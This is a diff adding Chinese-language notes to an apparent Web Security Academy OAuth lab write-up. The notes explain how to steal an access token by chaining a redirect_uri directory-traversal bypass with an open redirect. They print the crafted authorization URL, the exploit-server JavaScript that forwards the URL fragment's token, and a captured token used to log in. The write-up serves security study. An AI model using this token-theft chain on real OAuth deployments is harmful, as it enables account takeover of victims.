@@ -76,7 +76,48 @@
         <img width="852" height="496" alt="image" src="https://github.com/user-attachments/assets/f27599eb-a11e-470d-b9e0-798a051aeb6f" />
 
     第四步：使用某个code登录admin成功
-    
-           
+
+
+
+第五关：
+    和第四关原理一样，只是他会检测redirect_url的地址是否和client_id一致，所以我们不能直接替换成我们的恶意网站地址，需要利用网站的目录遍历（../）和url重定向功能
+    第一步：
+        1、走流程，了解业务流程，很清楚的知道这个OAuth认证是需要你先输入账号密码，成功后再重定向至一开始的redirect_url的地址加上锚点#access_token，我们要的就是token，但是
+        这里有问题就是和第三关不一样，锚点是不会传送到服务器的，所以要先提取出锚点内容再传送
+
+        2、这个网站有个url重定向功能，就是在某个商品页面下面有个next按钮，他会发出请求如：/post/next?path=/post?postId=4
+        可以将path改为任意网址都能重定向
+    第二步：
+        绕过client_id和redirect_url的匹配，直接使用：https://oauth-0a9a00370365aee2808e339b02450008.oauth-server.net
+        /auth?client_id=qa15hk672h46t02imp46n&redirect_uri=https://0a8200ed0309aed980923595003d00fb.web-security-academy.net
+        /oauth-callback/../post/next?path= https://exploit-0a15008c035dae3c809a34410137000e.exploit-server.net/exploit
+        &response_type=token&nonce=57197118&scope=openid%20profile%20email
+
+        重点是redirect_url参数最终指向的是恶意网站
+
+   第三步：在恶意网站构造js代码如下：
+       <script>
+        if (!document.location.hash) {
+            window.location = 'https://oauth-0a9a00370365aee2808e339b02450008.oauth-server.net
+            /auth?client_id=qa15hk672h46t02imp46n&redirect_uri=https://0a8200ed0309aed980923595003d00fb.web-security-academy.net
+            /oauth-callback/../post/next?path= https://exploit-0a15008c035dae3c809a34410137000e.exploit-server.net/exploit
+            &response_type=token&nonce=57197118&scope=openid%20profile%20email'
+        } else {
+            window.location = '/?'+document.location.hash.substr(1)
+        }
+       </script>
+
+       该代码中最重要的就是document.location.hash.substr(1)，他把锚点后面的内容转为参数上传，否则服务器无法得到token值
+       并且if else语句防止了上面第四关一样的循环，因为如果和第四关一样，当受害者认证成功，重定向至恶意网站，这样优惠继续执行认证，一直循环
+
+   第四步：攻击
+       <img width="1264" height="60" alt="image" src="https://github.com/user-attachments/assets/baca3499-9ba8-4f1a-96fa-ff2da870819c" />
+
+        成功获得token，直接访问：
+        https://0a8200ed0309aed980923595003d00fb.web-security-academy.net/
+        oauth-callback#access_token=kNyY7eGQTqei6banv5GpnsTms8H43hChuGEuTz4nfj8&
+        expires_in=3600&token_type=Bearer&scope=openid%20profile%20email.
+      <img width="838" height="415" alt="image" src="https://github.com/user-attachments/assets/bdd432b4-d73e-4221-9f10-3f0481a057f1" />
+      成功   
     
 
